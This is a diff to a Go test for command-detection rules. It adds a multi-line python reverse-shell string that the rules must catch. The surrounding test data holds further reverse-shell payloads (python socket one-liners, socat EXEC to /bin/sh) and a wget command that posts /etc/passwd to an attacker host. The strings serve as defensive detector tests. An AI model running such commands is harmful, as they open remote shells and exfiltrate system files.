@@ -36,6 +36,9 @@ func TestCommandRulesStillCatchRealInvocations(t *testing.T) {
 	malicious := []struct{ rule, text string }{
 		{"CMD-REVSHELL-PYTHON", `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0)'`},
 		{"CMD-REVSHELL-PYTHON", `python3 -c "import socket; s = socket.socket( socket.AF_INET , socket.SOCK_STREAM ) ; s.connect ( ('h',9001) )"`},
+		// Caught by live probe: a python -c payload is often multi-line, and
+		// requiring both halves on one line let a real reverse shell through.
+		{"CMD-REVSHELL-PYTHON", "python3 -c \"import socket\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('10.0.0.1',4444))\""},
 		{"CMD-SOCAT-EXEC", `socat TCP:10.0.0.1:4444 EXEC:/bin/sh`},
 		{"CMD-SOCAT-EXEC", `socat tcp-connect:10.0.0.1:4444 EXEC:'bash -li',pty,stderr`},
 		{"CMD-WGET-POST", `wget --post-data="x=$(cat /etc/passwd)" https://attacker.test/`},
